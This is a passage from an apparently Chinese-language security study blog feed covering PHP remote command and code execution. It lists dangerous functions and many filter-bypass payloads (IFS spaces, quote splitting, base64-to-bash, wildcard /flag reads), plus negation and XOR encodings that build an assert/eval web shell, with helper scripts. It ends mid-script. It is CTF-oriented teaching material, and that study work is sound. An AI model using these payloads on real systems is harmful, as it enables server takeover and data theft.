class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;ssrf&quot;</span>));</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 后端漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>远程命令执行</title>
      <link href="/2024/05/13/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2024/05/13/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p><strong>RCE</strong>漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统</p><p>后端漏洞</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>一般出现这种漏洞，是因为<strong>应用系统从设计上需要给用户提供指定的远程命令操作的接口</strong>。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 现在很多的企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞。 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p><p><strong>在Web应用开发中为了灵活性、简洁性等会让应用调用代码执行函数或系统命令执行函数处理，若应用对用户的输入过滤不严，容易产生远程代码执行漏洞或系统命令执行漏洞</strong></p><h2 id="系统命令执行函数"><a href="#系统命令执行函数" class="headerlink" title="系统命令执行函数"></a>系统命令执行函数</h2><blockquote><p>system()     能将字符串作为OS命令执行，且返回命令执行结果</p><p>passthru()   能将字符串作为OS命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输</p><p>​             出到标准输出设备上         </p><p>shell_exec()    能将字符串作为OS命令执行</p><p>exec()     能将字符串作为OS命令执行，但是只返回执行结果的最后一行(约等于无回显)</p><p>shell_exec()     能将字符串作为OS命令执行</p><p>popen()    打开进程文件指针</p><p>proc_open()    与popen()类似</p><p>pcntl_exec()    在当前进程空间执行指定程序</p></blockquote><h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><blockquote><p>eval()：将字符串作为php代码执行；</p><p>assert()：将字符串作为php代码执行；</p><p>preg_replace()：正则匹配替换字符串；</p><p>create_function()：主要创建匿名函数；</p><p>call_user_func()：回调函数，第一个参数为函数名，第二个参数为函数的参数；</p><p>call_user_func_array()：回调函数，第一个参数为函数名，第二个参数为函数参数的数组；</p><p>可变函数： 若变量后有括号，该变量会被当做函数名为变量值(前提是该变量值是存在的函数名)的函数   </p><p>​         执行</p></blockquote><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><p>Linux:</p><table><thead><tr><th>管道符</th><th>实例</th><th>描述</th></tr></thead><tbody><tr><td>;</td><td>A;B</td><td>无论真假，A与B都执行</td></tr><tr><td>&amp;</td><td>A&amp;B</td><td>无论真假，A与B都执行</td></tr><tr><td>&amp;&amp;</td><td>A&amp;&amp;B</td><td>A为真时才执行B，否则只执行A</td></tr><tr><td>|</td><td>A|B</td><td>显示B的执行结果</td></tr><tr><td>||</td><td>A||B</td><td>A为假时才执行B，否则只执行A</td></tr></tbody></table><p>Windows:</p><table><thead><tr><th>管道符</th><th>实例</th><th>描述</th></tr></thead><tbody><tr><td>|</td><td>A|B</td><td>显示B的执行结果</td></tr><tr><td>||</td><td>A||B</td><td>A为假时才执行B，否则只执行A</td></tr><tr><td>&amp;</td><td>A&amp;B</td><td>无论真假，A与B都执行</td></tr><tr><td>&amp;&amp;</td><td>A&amp;&amp;B</td><td>A为真时才执行B，否则只执行A</td></tr></tbody></table><h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><table><thead><tr><th>以下可代替空格</th><th></th><th></th></tr></thead><tbody><tr><td>&lt;</td><td>&lt;&gt;</td><td>%20(即space)</td></tr><tr><td>%09(即tab)</td><td><code>$IFS$9</code></td><td>${IFS}</td></tr><tr><td>$IFS</td><td>{cat,&#x2F;flag}</td><td></td></tr></tbody></table><p><code>$IFS</code>在linux下表示分隔符，但是如果单纯的<code>cat$IFS2</code>，bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，因此这里加一个{}就固定了变量名。<br>同理，在后面加个<code>$</code>可以起到截断的作用，使用<code>$9</code>是因为它是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p><h3 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h3><p>比如说禁用了cat ls flag等</p><p><strong>\绕过</strong></p><blockquote><p>c\at &#x2F;flag</p><p>l\s &#x2F;</p></blockquote><p><strong>单引号绕过</strong></p><blockquote><p>c’’at flag</p><p>l’’s &#x2F;</p></blockquote><p><strong>双引号绕过</strong> </p><blockquote><p>c””at flag</p><p>l””s &#x2F;</p></blockquote><p><strong>Shell 特殊变量绕过</strong></p><blockquote><p>ca$@t flag</p></blockquote><p><strong>变量拼接</strong></p><blockquote><p>b&#x3D;ag</p><p>cat &#x2F;fl$b</p></blockquote><p><strong>读flag</strong></p><blockquote><p>eval(var_dump(file_get_contents($_POST[‘a’])););&amp;a&#x3D;&#x2F;flag</p></blockquote><p><strong>_过滤</strong></p><blockquote><p>php8以下，变量名中的第一个非法字符[会被替换为下划线_</p><p>e_v.a.l&#x3D;&#x3D;&gt;e[v.a.l</p></blockquote><p><strong>php标签过滤</strong></p><p><code>?&gt;&lt;?= phpinfo(); ?&gt;</code></p><p><code>&lt;? ?&gt;等价于&lt;?php ?&gt;</code></p><p><code>&lt;?= &gt;等价于&lt;?php echo ?&gt;</code></p><p><strong>编码绕过</strong></p><p>可以使用各种编码进行绕过</p><blockquote><p>base64编码绕过,编码cat &#x2F;flag，反引号、| bash、<code>$()</code>用于执行系统命令<br>echo Y2F0IC9mbGFn | base64 -d&#96;<br>echo Y2F0IC9mbGFn | base64 -d | bash<br>$(echo Y2F0IC9mbGFn | base64 -d)</p><p>hex编码绕过，编码cat &#x2F;flag,| bash用于执行系统命令<br>echo ‘636174202f666c6167’ | xxd -r -p | bash</p><p>shellcode编码<br>十六进制编码</p></blockquote><p><strong>正则匹配的绕过</strong></p><blockquote><p>cat &#x2F;f???</p><p>cat &#x2F;fl*</p><p>cat &#x2F;f[a-z]{3}</p></blockquote><h3 id="其他绕过"><a href="#其他绕过" class="headerlink" title="其他绕过"></a>其他绕过</h3><h4 id="cat替换命令"><a href="#cat替换命令" class="headerlink" title="cat替换命令"></a>cat替换命令</h4><table><thead><tr><th>more</th><th>less</th><th>cat</th><th>tac</th></tr></thead><tbody><tr><td>head</td><td>tail</td><td>vi</td><td>vim</td></tr><tr><td>nl</td><td>od</td><td>sort</td><td>uniq</td></tr></tbody></table><table><thead><tr><th>tac</th><th>与cat相反，按行反向输出</th></tr></thead><tbody><tr><td>more</td><td>按页显示，用于文件内容较多且不能滚动屏幕时查看文件</td></tr><tr><td>less</td><td>与more类似</td></tr><tr><td>tail</td><td>查看文件末几行</td></tr><tr><td>head</td><td>查看文件首几行</td></tr><tr><td>nl</td><td>在cat查看文件的基础上显示行号</td></tr><tr><td>od</td><td>以二进制方式读文件，od -A d -c &#x2F;flag转人可读字符</td></tr><tr><td>xxd</td><td>以二进制方式读文件，同时有可读字符显示</td></tr><tr><td>sort</td><td>排序文件</td></tr><tr><td>uniq</td><td>报告或删除文件的重复行</td></tr></tbody></table><table><thead><tr><th>file</th><th>报错文件内容</th></tr></thead><tbody><tr><td>grep</td><td>过滤查找字符串，grep flag &#x2F;flag</td></tr></tbody></table><h4 id="回溯绕过"><a href="#回溯绕过" class="headerlink" title="回溯绕过"></a>回溯绕过</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//php正则的回溯次数大于1000000次时返回False</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello world&#x27;</span>+<span class="string">&#x27;h&#x27;</span>*<span class="number">1000000</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/hello.*world/is&quot;</span>,<span class="variable">$a</span>) == False</span><br></pre></td></tr></table></figure><h4 id="函数绕过"><a href="#函数绕过" class="headerlink" title="函数绕过"></a>函数绕过</h4><p><img src="https://bu.dusays.com/2024/05/13/664161d1796e4.png" alt="image-20240329233618962"></p><p><code>system(current(getallheaders()));</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gettallheaders()将报文头信息转为数组返回</span><br><span class="line">current（）将数组当前元素返回（默认指向第一个元素）</span><br><span class="line">因此我们只需在报文头最前面添加一个执行命令即可</span><br></pre></td></tr></table></figure><p><code>passthru</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如：eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);</span><br><span class="line"></span><br><span class="line">$Str=passthru（chr(108).chr(115).chr(32).chr(47)）;(等于`ls /`)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>scandir</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(scandir(chr(47)));       （chr(47)==/,该命令会显示根目录下的文件）</span><br><span class="line"></span><br><span class="line">var_dump(scandir(‘./’)) 查看上级目录来查看当前文件名</span><br><span class="line">eval(var_dump(scandir(&#x27;/&#x27;););读根目录：</span><br></pre></td></tr></table></figure><p><code>glob</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">glob(&quot;*&quot;)  匹配任意文件</span><br><span class="line">glob(&quot;*.txt&quot;)  匹配以txt为后缀的文件</span><br><span class="line"></span><br><span class="line">所以也可以使用：</span><br><span class="line">?cmd=print_r(glob(&quot;*&quot;));</span><br></pre></td></tr></table></figure><h4 id="嵌套绕过"><a href="#嵌套绕过" class="headerlink" title="嵌套绕过"></a>嵌套绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">？c=eval($_GET[1]);&amp;1=system(&#x27;tac flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">还有get_defined_vars()的形式</span><br><span class="line"></span><br><span class="line">?c=include/require$_GET[1];&amp;1=php://filter/convert.base64-encode/resource=flag.php   伪协议的嵌套</span><br></pre></td></tr></table></figure><h4 id="分号绕过"><a href="#分号绕过" class="headerlink" title="分号绕过"></a>分号绕过</h4><p>假如过滤分号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">那么可以直接 ?&gt; 闭合php（ ?&gt; 闭合的是eval里面的php语句，eval后续还有语句的话，依旧是会执行的。除此以外，php代码最后一句可以不用加分号，可以绕过分号的过滤）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如下面代码所示</span><br><span class="line">?c=include$_GET[&quot;a&quot;]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h4 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h4><p>preg_match()遇到数组会直接返回flase。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a[]=&#x27;flag.php&#x27;;</span><br><span class="line">     </span><br><span class="line">$a=array(&#x27;flag.php&#x27;);</span><br><span class="line">     </span><br><span class="line">$a=[&#x27;flag.php&#x27;];</span><br></pre></td></tr></table></figure><h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><p>取反符号~，用的字符不会触发正则表达式</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//取反传参</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//输出得到取反传参内容</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;?cmd=(~&quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;)(~&quot;</span>.<span class="variable">$d</span>.<span class="string">&quot;);&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  <span class="comment">//在命令行中运行</span></span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line">    <span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line">    <span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果要<strong>绕过正则RCE</strong>，我们可以采用url取反绕过，如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%8F%97%8F%96%91%99%90)();</span><br><span class="line"># %8F%97%8F%96%91%99%90 : phpinfo</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161ccaf36c.png" alt="image-20240330111337425"></p><ul><li><p>这里还利用了一点是：对于PHP，形如 <code>(func_name)()</code>，其中func_name可以是字符串，会执行这个func</p></li><li><p>这里相当于执行了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpinfo()</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://bu.dusays.com/2024/05/13/664161cd91713.png" alt="image-20240330112128952"></p><p>但是</p><p>上述代码取反后应该是(system)(ls); 并不是正常的system(ls);</p><p>所以如果直接执行phpinfo() 是不会被执行的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%8F%97%8F%96%91%99%90%D7%D6);</span><br><span class="line"># %8F%97%8F%96%91%99%90%D7%D6 : phpinfo()</span><br></pre></td></tr></table></figure><ul><li>当 <code>(~%8F%97%8F%96%91%99%90%D7%D6);</code>被当作代码执行时的第一步就是取反操作 <code>~</code></li><li>但是取反得到的字符串 <code>phpinfo()</code>并不会被当作代码执行，因为在取反之前PHP解释器并不知道这原来是 <code>phpinfo()</code></li></ul><p>所以：</p><p><strong>对于已知过滤条件，想要执行我们指定的代码，必须有 <code>(func_name)()</code>这样的形式</strong></p><p>那么想用蚁剑这样的工具的话，需要让其执行我们POST提交的数据，由问题1可以知道，若构造：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2);</span><br><span class="line"># %DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2 : $_POST[shell]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样是不能得到执行结果的</p><p>以<code>(func_name)()</code>这样的形式，去执行 <code>(&quot;assert&quot;)(&quot;$_POST[shell]&quot;)</code> 构造payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2);</span><br><span class="line"># %9E%8C%8C%9A%8D%8B : assert</span><br><span class="line"># %DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2 : $_POST[shell]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是也是执行不成功</p><p>原因：</p><ol><li>第一层eval：首先 <code>(~%9E%8C%8C%9A%8D%8B)(~%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2);</code> 先会执行取反函数，得到 <code>(&quot;assert&quot;)(&quot;$_POST[shell]&quot;)</code></li><li>第二层assert：注意第二个括号里其实还是字符串，并不是真正的 <code>$_POST[shell]</code> 代码。PHP在解释的时候会找到名为assert的函数，assert会把 <code>$_POST[shell]</code> 变成真正的PHP代码。也就是说现在可以传参过来了，但是却没有执行。</li></ol><p>那么要想要执行 <code>$_POST[shell]</code>，还要在在前面追加一个 <code>eval</code>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6);</span><br><span class="line"># %9E%8C%8C%9A%8D%8B : assert</span><br><span class="line"># %9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6 : eval($_POST[shell])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以执行</p><ol><li>第一层eval：首先 <code>(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6);</code> 先会执行取反函数，得到 <code>(&quot;assert&quot;)(&quot;eval($_POST[shell])&quot;)</code></li><li>第二层assert：将字符串 <code>&quot;eval($_POST[shell])&quot;</code> 看作php代码执行</li><li>第三层eval：将 <code>$_POST[shell]</code> 传来的数据看作代码执行</li></ol><h3 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h3><p>在 PHP 中两个字符串异或之后，得到的还是一个字符串。原理是转换为二进制进行异或。如果正则匹配过滤了字母和数字，那就可以使用两个不在正则匹配范围内的非字母非数字的字符进行异或，从而得到我们想要的字符串。</p><p>异或（XOR）是一种逻辑运算，它的原理如下：</p><p>符号表示： 异或运算用符号 ^ 表示。</p><p>定义： 对于两个二进制位，如果相应位相同则结果为 0，如果相应位不同则结果为 1。</p><p>下面是异或运算的真值表：</p><table><thead><tr><th>A</th><th>B</th><th>A XOR B</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>0</td></tr><tr><td>0</td><td>1</td><td>1</td></tr><tr><td>1</td><td>0</td><td>1</td></tr><tr><td>1</td><td>1</td><td>0</td></tr></tbody></table><p>对于整个二进制数，异或运算会对每一位进行独立的操作。</p><p>异或的性质：</p><blockquote><p>交换律： A XOR B 等于 B XOR A<br>结合律： (A XOR B) XOR C 等于 A XOR (B XOR C)<br>自反性： A XOR A 等于 0<br>零元素： A XOR 0 等于 A</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 异或构造Python脚本</span></span><br><span class="line">valid = <span class="string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span></span><br><span class="line"> </span><br><span class="line">answer = <span class="built_in">input</span>(<span class="string">&#x27;输入异或构造的字符串:&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">tmp1, tmp2 = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> valid:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> valid:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(c):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;&quot;<span class="subst">&#123;tmp1&#125;</span>&quot;^&quot;<span class="subst">&#123;tmp2&#125;</span>&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">phpinfo <span class="string">&quot;0302181&quot;</span>^<span class="string">&quot;@[@[_^^&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//异或php脚本</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++)</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;%&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$a</span>[<span class="variable">$i</span>])^<span class="number">0xff</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;^&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$j</span>++)</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;%ff&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//输出：%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;res.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">      <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">          <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">          <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">        <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">        <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">          <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><p>先用该脚本生成所有字符异或后的结果，用于下一个脚本的使用。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">    <span class="keyword">import</span> urllib</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">       s1=<span class="string">&quot;&quot;</span></span><br><span class="line">       s2=<span class="string">&quot;&quot;</span></span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">           f=<span class="built_in">open</span>(<span class="string">&quot;res.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">           <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">               t=f.readline()</span><br><span class="line">               <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">                   <span class="keyword">break</span></span><br><span class="line">               <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">   